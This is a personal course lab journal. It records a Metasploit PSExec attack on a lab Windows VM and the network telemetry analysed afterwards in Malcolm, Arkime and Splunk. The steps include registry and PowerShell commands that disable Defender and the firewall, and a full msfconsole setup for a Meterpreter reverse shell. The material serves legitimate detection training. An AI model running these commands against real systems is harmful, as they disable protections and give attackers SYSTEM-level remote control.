# Course Lab Journal
**Course:** Just Hacking / Constructing Defense  
**Domain:** `<REDACTED>`  
**Started:** June 2026

This journal tracks hands-on course labs as they are completed. Each entry records the objective, steps taken, what was observed in telemetry, and any gotchas encountered.

---

## How to Use This Journal

Each lab entry follows this structure:

```
## Lab [N] — [Lab Name]
**Module:** [Course module name]
**Date:** YYYY-MM-DD
**Status:** [ ] In Progress | [x] Complete

### Objective
What the lab is trying to demonstrate or teach.

### Steps Taken
Numbered steps of what was actually done.

### Telemetry / Detections
What showed up in Splunk, Malcolm, or logs.

### Notes & Gotchas
Anything unexpected, fixes required, or lessons learned.
```

---

## Labs

<!-- Add new lab entries below this line -->

---

## Lab 1 — Our Second Shell: Exploring the Network Layer
**Module:** 06 - Our Second Shell  
**Date:** 2026-06-13  
**Status:** [x] Complete (Malcolm analysis done; Splunk queries pending license reset)

### Objective
Use Metasploit's PSExec module to remotely execute a payload on a victim Windows host using valid domain admin credentials, then analyze the resulting network telemetry in Malcolm. The focus is on extracting investigative value from packet captures — NTLM authentication details, JA3/JA4 TLS fingerprints, certificate thumbprints, and connection baselining — even when traffic is encrypted.

### Steps Taken

1. Confirmed victim host (Win11V) IP address via bridged USB-C Ethernet adapter on Parallels
2. Confirmed attacker host (LinuxA) IP address on Proxmox
3. Disabled Windows Defender on Win11V via registry key:
   ```
   reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
   ```
   Confirmed with `Get-MpComputerStatus | Select AMRunningMode` → "Not running"
4. Disabled Windows Firewall on Win11V:
   ```powershell
   Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
   ```
5. Launched Metasploit on LinuxA with `sudo msfconsole` and configured PSExec:
   ```
   use exploit/windows/smb/psexec
   set sslversion TLS1.2
   set rhosts <victim IP>
   set smbuser Administrator
   set smbdomain <REDACTED>
   set smbpass <REDACTED>
   set lport 443
   set payload windows/meterpreter/reverse_https
   set target 0
   ```
6. Initial attempts with x64 payloads (`windows/x64/meterpreter/reverse_https`, `windows/x64/meterpreter/reverse_tcp`) failed — service binary would not execute on ARM64 Windows under emulation
7. Switched to x86 payload `windows/meterpreter/reverse_tcp` on port 4444 — session opened successfully as `NT AUTHORITY\SYSTEM`
8. Re-ran with x86 HTTPS payload `windows/meterpreter/reverse_https` on port 443 to generate TLS traffic for Malcolm analysis
9. Ran `shell`, `whoami`, and `ipconfig` inside the Meterpreter session to generate traffic
10. Captured traffic on LinuxA using tcpdump:
    ```bash
    sudo tcpdump -i enp6s18 host <victim IP> -w /tmp/psexec_capture.pcap
    ```
11. Uploaded PCAP to Malcolm and committed the file
12. Analyzed sessions in Arkime

### Telemetry / Detections

**Malcolm / Arkime — Session Overview**

104 sessions captured between LinuxA and Win11V after PCAP upload, including tcp, tls, smb, ntlm, ssl, and conn log types across zeek, suricata, and arkime data sources.

**Malcolm / Arkime — NTLM Authentication (from packet capture)**

Arkime query: `ip == <attacker IP> && ip == <victim IP> && protocols == ntlm`

Key findings from NTLM session expansion:
- **User:** Administrator
- **Originating Host:** LinuxA on port 34451
- **Responding Host:** Win11V on port 445
- **Action:** Authenticate → **Result:** Success
- **Protocols:** tcp, gssapi, smb, ntlm
- **OUI identification:** Source MAC → Proxmox Server Solutions GmbH, Dest MAC → Parallels, Inc.

This authentication data was extracted entirely from the packet capture with no host-based logging required.

**Malcolm / Arkime — TLS Session Analysis**

Expanded TLS session details:
- **TLS Version:** TLSv1.2 (set intentionally; TLS 1.3 fully encrypts the data we need here)
- **Cipher:** TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
- **JA3 Hash:** `0696c16261fe58808f9fa965be137acd`
- **JA3s Hash:** `ec74a5c51106f0419184d0dd08fb05bc`
- **JA4:** `t13i2012h2_2b729b4bf6f3_e24568c0d440`
- **JA4s:** `t120400_c030_12a20535f9be`

**Certificate Information:**
- **Issuer/Subject:** Self-signed (Metasploit-generated)
- **Certificate Thumbprint:** `da:9e:2c:b8:93:e7:0d:a1:a2:98:99:98:67:d3:e5:e2:e6:6b:38:45`
- **Validity:** 2024/09/22 – 2029/09/21
- **Tags:** cert:self-signed

**Malcolm / Arkime — JA3 Pivot**

Filtered all sessions by JA3 hash to scope investigation beyond a single IP. In a real-world environment with thousands of hosts, this fingerprint would surface additional compromised systems using the same C2 implant even if only a subset had endpoint logging enabled.

**Malcolm / Arkime — Certificate Thumbprint Pivot**

Filtered by certificate hash to find all sessions using the same Metasploit-generated self-signed certificate. Like JA3, this provides another investigation pivot point independent of IP addresses.

**Malcolm — Connections View with Baseline**

Connections tab showing the two-node relationship graph with 24-hour baseline enabled. Sparkle icons indicate both hosts are newly communicating within the baseline period — a useful indicator for identifying anomalous network relationships.

**Splunk — Command Line Length Detection (pending license reset)**

```splunk
index=sysmon
| where EventCode = 1
| eval CommandLineLength = len(CommandLine)
| eval ParentCommandLineLength = len(ParentCommandLine)
| where (ParentCommandLineLength > 2500 OR CommandLineLength > 2500)
| where ParentImage != "C:\\Windows\\explorer.exe"
| where ParentImage != "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe"
| table CommandLine,ProcessGuid
```

Splunk license exceeded daily 500MB quota — queries will be run after midnight reset.

### Notes & Gotchas

**Parallels Bridged Networking on Apple Silicon**
- Bridged networking via Wi-Fi does not work on Parallels with Apple Silicon — adapter shows "Media disconnected" regardless of settings
- Bridged networking via USB-C Ethernet adapter (AX88179B chipset) also initially failed — "Network initialization failed" error when set as the only adapter
- **Solution that worked:** Keep original adapter on Shared Network, add a second adapter bridged to the USB-C Ethernet, reboot the VM. After reboot, the bridged adapter picked up a LAN address via DHCP from the router
- This is a critical fix — multiple future course modules require the attacker VM to connect directly to Windows targets

**ARM64 Payload Compatibility**
- Win11V runs ARM64 Windows on Parallels/Apple Silicon
- x64 Metasploit payloads (`windows/x64/meterpreter/reverse_https`, `windows/x64/meterpreter/reverse_tcp`) fail silently — the PSExec service binary does not execute under x64 emulation on ARM64
- **x86 payloads work:** `windows/meterpreter/reverse_tcp` and `windows/meterpreter/reverse_https` both establish sessions successfully
- This is an important distinction from the `Sysmon64a.exe` requirement — Sysmon needs the ARM64-native binary, but Metasploit payloads need x86 (not x64) for emulation compatibility

**Malcolm PCAP Upload Workflow**
- Malcolm does not automatically capture LAN traffic — it only sees traffic on its own interface unless a SPAN/mirror port is configured on the switch
- For this lab: captured traffic on LinuxA with `tcpdump -i enp6s18 host <target> -w /tmp/capture.pcap`, then uploaded to Malcolm via the web UI at `/upload`
- Malcolm credentials reset: use `./scripts/auth_setup` → option 3 (admin) from the Malcolm VM

**Splunk Free License**
- Trial license expired after exceeding 500MB/day limit multiple times
- Switched to Free license via Settings → Licensing → Change license group
- Free license blocks searches when daily quota exceeded — resets at midnight
- For future: be mindful of ingestion volume; consider disabling unnecessary inputs during non-lab periods

**Key Investigative Concepts from This Section**
- NTLM authentication details can be extracted from packet captures without any host logging — provides a fallback when endpoint telemetry is unavailable
- JA3/JA3s hashes fingerprint TLS handshake behavior — useful for pivoting beyond IP-based investigation
- Certificate thumbprints provide another pivot point for scoping incidents
- TLS 1.2 was used intentionally — TLS 1.3 encrypts the handshake data that makes JA3 analysis possible
- Connection baselining in Malcolm highlights new/anomalous network relationships

---

<!-- Template for future labs — copy and paste below -->
<!--
## Lab N — [Lab Name]
**Module:**  
**Date:**  
**Status:** [ ] In Progress

### Objective


### Steps Taken
1. 

### Telemetry / Detections
```splunk

```

### Notes & Gotchas

-->
